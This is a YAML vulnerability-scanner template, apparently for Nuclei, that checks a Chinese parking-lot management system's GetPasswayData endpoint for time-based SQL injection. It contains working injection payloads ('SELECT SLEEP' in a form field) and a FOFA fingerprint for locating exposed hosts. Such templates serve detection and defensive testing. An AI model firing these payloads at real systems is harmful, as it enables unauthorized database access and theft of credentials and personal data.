http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /LaneMonitor/GetPasswayData HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          SentryHost_No=1';SELECT+SLEEP(4)#
        - |
          POST /LaneMonitor/GetPasswayData HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          SentryHost_No=1';SELECT+SLEEP(8)#
id: tingchechang-GetPasswayData-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="938984120"
        停车场后台管理系统 GetPasswayData 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 停车场后台管理系统 GetPasswayData SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486909&idx=1&sn=38196687551dfb4accd375d9a27c9dac&chksm=c267b88ef5103198acdeab3ef21f55a6c24c9d8cb8f7a5216b2095213bdecd912a7e3fbf005b&token=239710718&lang=zh_CN#rd
    severity: high
    tags: []
